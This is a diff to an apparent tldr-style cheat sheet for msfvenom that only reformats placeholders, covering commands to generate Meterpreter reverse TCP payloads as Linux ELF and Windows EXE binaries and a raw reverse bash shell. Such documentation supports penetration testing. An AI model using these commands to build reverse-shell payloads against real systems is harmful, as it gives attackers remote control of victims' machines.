@@ -13,16 +13,16 @@
 
 - Show payload options:
 
-`msfvenom -p {any something} --list-options`
+`msfvenom -p {string value: payload} --list-options`
 
 - Create an ELF binary with a reverse TCP handler:
 
-`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={any something} LPORT={any something} -f elf -o {any something}`
+`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={string value: local_ip} LPORT={string value: local_port} -f elf -o {string value: path/to/binary}`
 
 - Create an EXE binary with a reverse TCP handler:
 
-`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={any something} LPORT={any something} -f exe -o {any something}`
+`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={string value: local_ip} LPORT={string value: local_port} -f exe -o {string value: path/to/binary.exe}`
 
 - Create a raw bash with a reverse TCP handler:
 
-`msfvenom -p cmd/unix/reverse_bash LHOST={any something} LPORT={any something} -f raw`
+`msfvenom -p cmd/unix/reverse_bash LHOST={string value: local_ip} LPORT={string value: local_port} -f raw`
